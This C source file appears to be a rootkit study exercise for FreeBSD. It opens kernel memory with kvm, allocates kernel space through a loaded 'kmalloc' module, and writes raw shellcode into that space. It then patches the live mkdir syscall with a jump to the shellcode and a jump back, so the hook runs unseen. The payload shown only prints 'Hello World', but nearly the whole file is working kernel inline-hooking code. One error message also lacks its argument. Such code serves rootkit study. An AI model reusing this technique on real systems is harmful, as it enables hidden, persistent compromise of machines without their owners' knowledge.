// So here what is happening is that we are going to patch
// the mkdir code again: but now we want to jmp to our shell
// code from the mkdir code and then jmp back again as if nothing
// has happened. 
// We need this because sometimes our shellcode will be big in size
// and it may not fit into the confines of an existing syscall code. 
// So we need to patch the existing syscall (mkdir) with a jmp
// instruction and then append the syscall code overwritten by
// the jmp to the shellcode.
// and then we add the jmp back to the syscall code after that
// It is a tedious bit of coding. 
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/sysent.h>

// kong has used both kmalloc code and another shell code 
// and he does the substitution into the mkdir code of both.
// This makes things quite complex. It would be better 
// to just use the shellcode and patch mkdir and use kmalloc
// as a syscall by itself. That is what I am going to do.

unsigned char hello[] = 
	"\x48"
	"\x65"
	"\x6c"
	"\x6c"
	"\x6f"
	"\x20"
	"\x57"
	"\x6f"
	"\x72"
	"\x6c"
	"\x64"
	"\x20"
	"\x00"
	"\x55"
	"\x89\xe5"
	"\x83\xec\x04"
	"\xc7\x04\x24\x00\x00\x00\x00"
	"\xe8\xfc\xff\xff\xff"
	"\x83\xc4\x04"
	"\x5d";

#define H_OFFSET_1 0x1f

unsigned char jump[] = "\xb8\x00\x00\x00\x00"
			"\xff\xe0";

int main(int argc, char ** argv) {
	
	int i, call_offset , syscall_num;

	struct module_stat stat ;

	char errbuf[_POSIX2_LINE_MAX];

	kvm_t *kd;

	struct nlist nl[] = { {NULL}, {NULL}, {NULL}};

	unsigned char mkdir_code[100];

	unsigned long addr = 0, size;

	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);

	if (kd == NULL) {
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

	nl[0].n_name = "printf";
	nl[1].n_name = "mkdir";

	if (kvm_nlist(kd, nl) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value) {
		fprintf(stderr, "ERROR: Symbol %s not found \n");
		exit(-1);
	}

	if (kvm_read(kd, nl[1].n_value, mkdir_code, 100) < 0 ) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	for (i = 0; i < 100 ; i++) {
		if (mkdir_code[i] == 0xe8) {
			call_offset = i;
			break;
		}
	}

	size = (unsigned long)sizeof(hello) + (unsigned long)call_offset +
		(unsigned long)sizeof(jump);

	stat.version = sizeof(stat) ;
	modstat(modfind("kmalloc"), &stat);

	syscall_num = stat.data.intval;

	syscall(syscall_num, size, &addr);

	printf("%x\n", addr);
	printf("Call offset for kern_mkdir is %d\n", call_offset);

	*(unsigned long *)&hello[22] = addr;
	*(unsigned long *)&hello[27] = nl[0].n_value - (addr + H_OFFSET_1);

	if (kvm_write(kd, addr, hello, sizeof(hello)) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (kvm_write(kd, addr + (unsigned long)sizeof(hello) - 1,
		mkdir_code, call_offset) < 0) {
			fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
			exit(-1);
	}

	*(unsigned long *)&jump[1] = nl[1].n_value + (unsigned long)call_offset;

	if (kvm_write(kd, addr + (unsigned long)sizeof(hello) - 1 +
		(unsigned long)call_offset, jump, sizeof(jump)) < 0) {
			fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
			exit(-1);
	}

	*(unsigned long *)&jump[1] = addr + 0x0d;

	if (kvm_write(kd, nl[1].n_value , jump, sizeof(jump)) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (kvm_close(kd) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}


	exit(0);
}


	


